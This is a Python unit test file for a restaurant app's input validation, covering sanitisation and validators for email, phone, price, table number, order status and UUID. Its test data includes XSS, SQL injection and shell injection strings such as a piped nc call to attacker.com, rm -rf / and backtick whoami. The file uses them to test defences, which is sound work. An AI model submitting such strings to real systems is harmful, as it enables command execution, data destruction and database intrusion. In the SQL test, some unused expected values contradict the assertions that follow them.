"""
Unit tests for input validation
"""
import pytest
from app.core.validation import (
    sanitize_input,
    validate_email,
    validate_phone,
    validate_price,
    validate_table_number,
    validate_order_status,
    sanitize_sql_input,
    validate_restaurant_id,
    validate_uuid
)


class TestInputSanitization:
    """Test input sanitization functions"""
    
    def test_sanitize_input_removes_dangerous_characters(self):
        """Test that dangerous characters are removed"""
        dangerous_inputs = [
            ("<script>alert('XSS')</script>", "alert('XSS')"),
            ("'; DROP TABLE orders; --", "' DROP TABLE orders --"),
            ('test"onclick="alert(1)"', 'testonclick=alert(1)'),
            ("test`whoami`", "testwhoami"),
            ("test|nc attacker.com", "testnc attacker.com"),
            ("test&& rm -rf /", "test rm -rf /"),
        ]
        
        for dangerous, expected in dangerous_inputs:
            result = sanitize_input(dangerous)
            assert result == expected
    
    def test_sanitize_input_preserves_safe_text(self):
        """Test that safe text is preserved"""
        safe_inputs = [
            "John's Pizza",
            "Order #12345",
            "Table 5 - Window seat",
            "Email: test@example.com",
            "Price: £10.99",
        ]
        
        for safe_input in safe_inputs:
            result = sanitize_input(safe_input)
            # Should preserve most of the input
            assert len(result) >= len(safe_input) - 5  # Allow some char removal


class TestEmailValidation:
    """Test email validation"""
    
    def test_valid_emails(self):
        """Test valid email formats"""
        valid_emails = [
            "test@example.com",
            "user.name@example.co.uk",
            "firstname+lastname@example.com",
            "test123@test-domain.com",
            "a@b.c",
        ]
        
        for email in valid_emails:
            assert validate_email(email) is True
    
    def test_invalid_emails(self):
        """Test invalid email formats"""
        invalid_emails = [
            "not-an-email",
            "@example.com",
            "user@",
            "user@@example.com",
            "user@example",
            "user @example.com",
            "user@exam ple.com",
            "",
            None,
        ]
        
        for email in invalid_emails:
            assert validate_email(email) is False


class TestPhoneValidation:
    """Test phone number validation"""
    
    def test_valid_phone_numbers(self):
        """Test valid phone formats"""
        valid_phones = [
            "+447123456789",
            "+1234567890",
            "+33123456789",
            "07123456789",  # UK mobile
            "01234567890",  # UK landline
        ]
        
        for phone in valid_phones:
            assert validate_phone(phone) is True
    
    def test_invalid_phone_numbers(self):
        """Test invalid phone formats"""
        invalid_phones = [
            "123",  # Too short
            "not-a-phone",
            "+44 71234 56789",  # Spaces not allowed
            "",
            None,
        ]
        
        for phone in invalid_phones:
            assert validate_phone(phone) is False


class TestPriceValidation:
    """Test price validation"""
    
    def test_valid_prices(self):
        """Test valid price values"""
        valid_prices = [
            "10.00",
            "0.01",
            "999.99",
            "50",
            10.00,
            0.01,
        ]
        
        for price in valid_prices:
            assert validate_price(price) is True
    
    def test_invalid_prices(self):
        """Test invalid price values"""
        invalid_prices = [
            "0.00",
            "0",
            "-10.00",
            "abc",
            "10.999",  # Too many decimals
            "",
            None,
            float('inf'),
            float('nan'),
        ]
        
        for price in invalid_prices:
            assert validate_price(price) is False


class TestTableNumberValidation:
    """Test table number validation"""
    
    def test_valid_table_numbers(self):
        """Test valid table numbers"""
        valid_tables = [
            "1",
            "10",
            "A1",
            "Table-5",
            "VIP-1",
        ]
        
        for table in valid_tables:
            assert validate_table_number(table) is True
    
    def test_invalid_table_numbers(self):
        """Test invalid table numbers"""
        invalid_tables = [
            "",
            None,
            "123456789012345678901",  # Too long
            "<script>",
            "'; DROP TABLE--",
        ]
        
        for table in invalid_tables:
            assert validate_table_number(table) is False


class TestOrderStatusValidation:
    """Test order status validation"""
    
    def test_valid_statuses(self):
        """Test valid order statuses"""
        valid_statuses = [
            "pending",
            "confirmed",
            "preparing",
            "ready",
            "completed",
            "cancelled",
        ]
        
        for status in valid_statuses:
            assert validate_order_status(status) is True
    
    def test_invalid_statuses(self):
        """Test invalid order statuses"""
        invalid_statuses = [
            "unknown",
            "PENDING",  # Wrong case
            "",
            None,
            "completed; DROP TABLE orders;",
        ]
        
        for status in invalid_statuses:
            assert validate_order_status(status) is False


class TestSQLInputSanitization:
    """Test SQL input sanitization"""
    
    def test_sql_injection_prevention(self):
        """Test SQL injection patterns are sanitized"""
        sql_injections = [
            ("'; DROP TABLE orders; --", " DROP TABLE orders "),
            ("1' OR '1'='1", "1 OR 11"),
            ("admin'--", "admin"),
            ("1 UNION SELECT * FROM users", "1 UNION SELECT  FROM users"),
        ]
        
        for injection, expected in sql_injections:
            result = sanitize_sql_input(injection)
            assert "DROP TABLE" not in result
            assert "--" not in result
            assert "'" not in result


class TestUUIDValidation:
    """Test UUID validation"""
    
    def test_valid_uuids(self):
        """Test valid UUID formats"""
        valid_uuids = [
            "550e8400-e29b-41d4-a716-446655440000",
            "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
            "00000000-0000-0000-0000-000000000000",
        ]
        
        for uuid_str in valid_uuids:
            assert validate_uuid(uuid_str) is True
    
    def test_invalid_uuids(self):
        """Test invalid UUID formats"""
        invalid_uuids = [
            "not-a-uuid",
            "550e8400-e29b-41d4-a716",  # Too short
            "550e8400-e29b-41d4-a716-446655440000-extra",  # Too long
            "550e8400-xxxx-41d4-a716-446655440000",  # Invalid chars
            "",
            None,
        ]
        
        for uuid_str in invalid_uuids:
            assert validate_uuid(uuid_str) is False